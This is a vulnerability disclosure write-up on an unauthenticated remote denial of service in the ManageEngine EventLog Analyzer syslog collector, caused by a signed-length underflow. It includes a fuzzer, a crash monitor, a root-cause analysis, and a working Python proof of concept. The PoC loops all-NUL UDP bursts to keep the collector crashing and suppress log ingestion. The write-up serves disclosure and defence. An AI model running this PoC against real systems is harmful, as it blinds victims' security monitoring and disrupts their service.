---
name: vr-writeup-ZVE-2026-3795
description: >-
  Vulnerability research reference: ZVE-2026-3795
gated: true
---
## Unauthenticated Remote Denial of Service in ManageEngine EventLog Analyzer Syslog Collector via Signed-Length Underflow in StringUtil::TrimAllNull

> ***Ethical Warning:** Research, educational, and authorized testing purposes only. Please do not use against systems without permission.*

---

In ManageEngine EventLog Analyzer 13.0.5 (build 13056), also distributed within Log360, the root-privileged `SysEvtCol` syslog collector contained a memory-safety defect in its native string-normalization routine `StringUtil::TrimAllNull(char*, int)`.

A small sequence of all-NUL UDP datagrams sent to the default syslog port underflows a signed length counter, producing an out-of-bounds read and write across adjacent heap memory that terminates the process with `SIGSEGV`.

The listener parses each datagram before authenticating its sender, so any unauthenticated party with network access to the port can reach the fault. Delivered continuously, the condition holds the collector in a persistent crash-restart cycle, during which the SIEM ceases log ingestion entirely.

* **CVE ID:** The vendor (Zoho) has not assigned one. 
* **Vulnerability Type:**
    * Root cause: [CWE-191](https://cwe.mitre.org/data/definitions/191.html) Integer Underflow
    * Memory safety: [CWE-125](https://cwe.mitre.org/data/definitions/125.html) Out-of-bounds Read and [CWE-787](https://cwe.mitre.org/data/definitions/787.html) Out-of-bounds Write
    * Impact: [CWE-400](https://cwe.mitre.org/data/definitions/400.html) Denial of Service
* **Affected Software:** ManageEngine EventLog Analyzer / Log360 (the bundled `SysEvtCol` syslog collector).
* **Affected Versions:** EventLog Analyzer 13.0.5 build 13056 and earlier. Fixed in build 13071.
* **Score:** 7.5 (High) `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
* **Author:** [Seth Kraft](https://github.com/skraft9)

---

## Timeline

* **June 2026:** Vulnerability discovered by fuzzing the collector's UDP syslog listeners.
* **June 18, 2026:** Reported to the Zoho / ManageEngine bug bounty program, with a working proof of concept attached.
* **June 24, 2026:** Follow-up confirming the same defect is reachable via the UDP/513 listener, not only UDP/514.
* **August 25, 2026:** Fix [released](https://www.manageengine.com/products/eventlog/features-new.html) in EventLog Analyzer build 13071, listed as "Hotfix".

---

<img width="1236" height="994" alt="Screenshot 2026-09-03 115048" src="https://github.com/user-attachments/assets/c3d8f84b-8802-4aa0-9f69-3e106dc2c24e" />

* **September 3, 2026:** Educational write-up published & social media announcements by Seth Kraft.
* **September 4, 2026:** Zoho updates release notes to re-classify bug as a Security Fix.

---

<img width="1241" height="1002" alt="Screenshot 2026-09-04 120722" src="https://github.com/user-attachments/assets/31eee46b-be64-4c04-8ab7-e89a5521cd45" />


---

## Fuzzing the Collector

EventLog Analyzer accepts agentless syslog on UDP/514, UDP/513, and TCP/514. These listeners accept input from any host that can reach the port, prior to authentication, which makes them the logical starting point for analysis.

`SysEvtCol` itself is a native binary executing as root, so a memory-safety defect in it carries considerably greater impact than one in the Java layer above it.

The harness is a small mutational fuzzer: it generates malformed syslog datagrams, transmits them at a controlled rate, and observes the daemon. Three properties keep it useful rather than noisy:

* **Seeded**, so any run reproduces exactly.
* **Rate-limited** to a few hundred packets per second, well below flood levels, so any failure reflects a parser defect rather than load.
* **Logged**, with every payload recorded to a manifest by send order, so a crash can be traced to the datagram responsible.

```python
#!/usr/bin/env python3
# Seeded, rate-limited syslog fuzzer for SysEvtCol. Deterministic replay,
# ~250 pkt/s (not a flood), every payload logged by index so a crash can be
# bisected back to the exact datagram that caused it.
import socket, sys, time, random

TARGET = (sys.argv[1], 514)
rng = random.Random(int(sys.argv[2]) if len(sys.argv) > 2 else 0)
manifest = open("fuzz_manifest.log", "w")

def mutate(i):
    tag = f"FZ-{i}".encode()                                  # correlatable marker
    k = rng.randrange(6)
    if k == 0:   # malformed PRI header
        return b"<" + rng.choice([b"", b"-1", b"9" * 40]) + b">" + tag + b" host app: msg"
    if k == 1:   # over-long hostname / tag / message
        return b"<13>Jun 18 10:00:00 " + b"H" * rng.choice([1024, 60000]) + b" app: " + tag
    if k == 2:   # degenerate: a packet of one repeated byte, including all-NUL  <-- the class that hit
        return rng.choice([b"\x00", b"\xff", b"\x20"]) * rng.choice([1, 64, 512, 4096])
    if k == 3:   # printf-style format specifiers
        return b"<13>Jun 18 10:00:00 host app: " + tag + b" " + b"%n%s%x%p" * 20
    if k == 4:   # RFC5424 structured-data, sometimes unterminated
        return b"<165>1 2026-06-18T10:00:00Z host app 1 " + tag + b" [" + b'k="v" ' * 200
    return bytes(rng.randrange(256) for _ in range(rng.choice([16, 4096, 60000])))  # random

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
for i in range(int(sys.argv[3]) if len(sys.argv) > 3 else 2000):
    p = mutate(i)
    s.sendto(p[:65507], TARGET)
    manifest.write(f"{i}\tlen={len(p)}\t{p[:60]!r}\n")
    time.sleep(0.004)                                         # rate-limit, not a flood
```

Executed against the collector, the harness produces a manifest that pairs each send index with its payload:

```
0	len=1054	b'<13>Jun 18 10:00:00 HHHHHHHHHHHHHHHHHHHH...'
1	len=1245	b'<165>1 2026-06-18T10:00:00Z host app 1 FZ-1 [k="v"...'
2	len=16	b'Pz\x08\x1cK\xbcz;\xad\xee\xb6\x8f\xc8\x86\xb0u'
3	len=60030	b'<13>Jun 18 10:00:00 HHHHHHHHHHHHHHHHHHHH...'
4	len=512	b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00...'
5	len=60000	b'\xd7v\xe9\xd6\xfa(\xec\xb8\xe0\xa1\xe6\xcf!\xfb\td...'
6	len=1054	b'<13>Jun 18 10:00:00 HHHHHHHHHHHHHHHHHHHH...'
7	len=1245	b'<165>1 2026-06-18T10:00:00Z host app 1 FZ-7 [k="v"...'
8	len=1245	b'<165>1 2026-06-18T10:00:00Z host app 1 FZ-8 [k="v"...'
```

Index 4 is the entry of interest: a datagram of entirely zero bytes, a degenerate case such parsers rarely account for.

Detecting the failure is the complementary requirement. `SysEvtCol` runs under a supervisor that restarts it, so a crash is unobservable unless the restart is monitored.

The following monitor watches the process identifier and, on each change, extracts the faulting instruction pointer from the kernel log:

```bash
#!/bin/bash
# Alert when SysEvtCol respawns and capture the faulting instruction pointer.
last=$(pgrep -x SysEvtCol)
while sleep 1; do
    now=$(pgrep -x SysEvtCol)
    if [ "$now" != "$last" ]; then
        echo "[!] SysEvtCol respawned: $last -> $now"
        dmesg | grep -i 'SysEvtCol.*segfault' | tail -1
        last=$now
    fi
done
```

With the monitor active during the burst, the behavior is unambiguous: the collector faults, the supervisor restarts it under a new pid, and a subsequent packet faults it again.

The process stabilizes only several seconds after transmission ceases; in this run it progressed from pid 1971 to 1984 before settling at 2667.

The kernel records each fault at the same address:

```
[Thu Sep  3 16:17:51 2026] SysEvtCol[1984]: segfault at 7d49c4021000 ip 000000000086ef5b sp 00007d49cc3e0d10 error 4 in SysEvtCol[400000+f1d000]
```

The instruction pointer is identical on every crash (`0x0086ef5b`), indicating a single faulting routine.

Because the run was seeded and logged, replaying it and reducing the manifest isolated the crash to one datagram, and then to the bytes responsible for it.

Reduction converged on a minimal trigger: a datagram composed exclusively of NUL bytes.

Inspection of a core dump captured at the fault established the root cause.

---

## Identifying the Logic Flaw

An incoming datagram is passed almost immediately to `StringUtil::TrimAllNull(char* buf, int len)`, a helper that trims trailing NUL bytes and rewrites any remaining embedded NULs to spaces (`0x20`) across a length-counted buffer.

`SysEvtCol` is a No-PIE binary, so the addresses below are absolute. Reconstructed from disassembly of `TrimAllNull` at entry RVA `0x0086ef12`, the logic is equivalent to:

```c
// buf = the received datagram, copied into a fixed 16480-byte pool slot
// len = the raw datagram length reported by recvfrom()

char *ptr = buf + len - 1;
while (*ptr == 0) {        // backward trim of trailing NULs
    ptr--;
    len--;                 // no lower-bound check against buf
}

char *p = buf;
int counter = len;         // len is now the loop counter
do {
    if (*p == 0) {
        *p = 0x20;         // rewrite embedded NUL to a space
    }
    p++;
} while (counter-- != 0);
```

The backward trim lacks a lower bound. It decrements `ptr` in search of a non-NUL byte, and a datagram consisting solely of NULs never provides one.

The loop therefore reads past the start of the buffer, and `len` underflows to a negative value.

The forward loop then relies on that length. `counter` begins negative, so its termination condition is unreachable for approximately two billion iterations.

`p` advances well beyond the 16480-byte slot, writing `0x20` over each NUL it encounters, until it reaches an unmapped page and the process terminates.

The core dump corroborates this precisely: the buffer was page-aligned at an arena boundary, the backward trim left `ptr` seven bytes before `buf`, `len` underflowed to a small negative value, and the forward traversal faulted several pages later.

* **Faulting read:** `0x0086ef5b : movzbl (%rax),%eax`
* **Faulting write:** `0x0086ef66 : movb $0x20,(%rax)`

The routine has a single call site (`0x0076b718`) on the UDP receive path, immediately following the `recvfrom` at `0x0076b6b6`.

That dispatch serves both the UDP/514 and UDP/513 listeners, which accounts for the identical fault on either port.

The TCP/514 framer follows a separate path and does not reach the routine.

---

## Vulnerability Mechanics

The determining factor is the composition of the datagram: it must consist entirely of NUL bytes.

A real `<PRI>` header, or any non-NUL byte at the tail, halts the backward trim, leaves the length positive, and averts the fault.

The remainder is deterministic: the trim underflows the length, the forward loop interprets it as a large positive count, and the collector reads beyond its buffer and faults as root.

The outcome is probabilistic per packet, since it depends on the pool slot residing near the end of a heap arena, so a short burst is used in place of a single datagram.

---

## What the Packets Look Like

A well-formed syslog datagram consists largely of printable text terminated by a newline, so the trailing-NUL trim encounters a non-NUL byte almost immediately and halts:

```
00000000  3c 33 34 3e 4f 63 74 20  31 31 20 32 32 3a 31 34  |<34>Oct 11 22:14|
00000010  3a 31 35 20 68 6f 73 74  20 73 73 68 64 5b 32 38  |:15 host sshd[28|
00000020  34 37 5d 3a 20 46 61 69  6c 65 64 20 70 61 73 73  |47]: Failed pass|
00000030  77 6f 72 64 20 66 6f 72  20 72 6f 6f 74 0a        |word for root.|
```

The trigger is the inverse: a datagram that presents no non-NUL byte at which the trim can stop:

```
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000030
```

`hexdump` collapses the repeated line to a single `*`. As the datagram contains no non-NUL byte, the backward trim does not terminate and reads past the start of the buffer.

---

## Proof of Concept (PoC)

**1. Prerequisites**

* Network access to the target's UDP syslog port (514 by default; 513 is equally affected).
* An unauthenticated position suffices. The collector parses each datagram before authenticating its sender.

**2. Execution.** A single burst faults the collector once.

Because a supervisor restarts it, the proof of concept below repeats the burst at an interval to maintain the outage for the duration of the run.

```python
#!/usr/bin/env python3
import socket
import sys
import time

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <TARGET_IP>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = 514

    print(f"[*] Targeting SysEvtCol on {target_ip}:{target_port}...")
    print("[*] Sending all-NUL UDP burst every 10 seconds. Press Ctrl+C to stop.")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        while True:
            print("[*] Sending burst...")
            for i in range(4000):
                payload_len = (i % 64) + 1
                payload = b"\x00" * payload_len
                s.sendto(payload, (target_ip, target_port))
            print("[+] Burst complete. Waiting 10 seconds...")
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    main()
```

Run it against the target:

```bash
python3 poc.py <TARGET_IP>
```

---

**3. Verify Impact.** The kernel logs the fault at the expected instruction pointer, and the collector's process identifier changes as the supervisor restarts it:

```bash
sudo dmesg | grep -i 'SysEvtCol.*segfault'
# SysEvtCol[1984]: segfault at 7d49c4021000 ip 000000000086ef5b error 4 in SysEvtCol[400000+f1d000]
```

**The supervisor does not remediate the issue.** It restarts the collector within a few seconds, but the proof of concept faults it again on each interval, so a continuous run keeps it unavailable.

Syslog over UDP is connectionless and unacknowledged, so any datagram arriving during a fault or restart is discarded by the operating system and lost.

The aggregate effect is a sustained loss of ingestion for the duration of the attack.

---

<img width="2522" height="1280" alt="PoC_v2 (1)" src="https://github.com/user-attachments/assets/7a25adb5-241c-48eb-ab56-9aefa4e6152c" />

> Tested on EventLog Analyzer 13.0.5 build 13056.

---

## Classification

The vendor addressed this as a general crash fix, without a CVE. The following establishes why it constitutes a security vulnerability rather than a functional defect.

* **Unauthenticated and remote.** The attacker is anonymous and external, and the sole prerequisite is a UDP datagram to a port the product binds by default, corresponding to an `AV:N/AC:L/PR:N/UI:N` exposure.
* **Memory corruption as root.** A signed underflow produces an out-of-bounds read and write within a daemon running as root, a memory-safety defect by class. The write is confined to a fixed `0x20` the attacker cannot direct, so the demonstrated impact is denial of service rather than code execution.
* **The affected component is a security control.** EventLog Analyzer and Log360 are SIEM products; an ingestion outage removes the telemetry on which detection depends, allowing an attacker to suppress collection while conducting other activity.
* **Sustained rather than transient.** Under continuous delivery the collector remains in a crash-restart loop, satisfying the CVSS v3.1 definition of `A:H`, a sustained total loss of availability, consistent with the assessed 7.5.

In summary, an all-NUL datagram to UDP/514 or UDP/513 faults the root collector, and during the outage the host ceases ingestion across every syslog channel (UDP/513, UDP/514, TCP/514) and the agent path.

---

## Resolution

The vendor remediated the issue in **EventLog Analyzer build 13071** (25 August 2026).

Log360 incorporates the same collector and is therefore affected; it receives the fix through the corresponding build.

Operators of either product should update to build 13071 or later. Specific hardening guidance follows in the Defensive Perspective.

---

## Takeaways

### Offensive Perspective

* **Fuzz with degenerate input:** empty datagrams, all-NUL payloads, and length fields that wrap are inexpensive to test and are precisely the cases hand-written C and C++ parsers omit. An unauthenticated UDP listener passing raw packets to a native string routine is a high-value target.
* **A negative length reads past the buffer:** when a trim or scan loop decrements a signed length without a lower bound, an all-delimiter input underflows it, and any subsequent loop that trusts that length reads and writes out of bounds.
* **A supervisor is not a mitigation:** where a crash is inexpensive and repeatable, it can be delivered continuously. A daemon that restarts within seconds remains unavailable under a sustained stream of triggers.

### Defensive Perspective

* **Bound the trim:** the backward loop requires a floor at `buf` and a length that cannot fall below zero. Unsigned sizes clamped at `0` prevent the underflow at its source.
* **Discard degenerate packets early:** empty or all-NUL datagrams are not valid syslog and should be rejected at the receive stage, before normalization.
* **Harden the binary:** compiling `SysEvtCol` with PIE, Full RELRO, and Fortify Source increases the cost and reduces the impact of any future native fault.
* **Treat the availability of a monitor as a security property:** for a SIEM, an ingestion outage is a detection gap an attacker can induce on demand, which warrants security triage and a CVE rather than a maintenance note.

> Source: skraft9/vulnerability-research. Authorized security work only. Gated skill: needs the developer keyword.
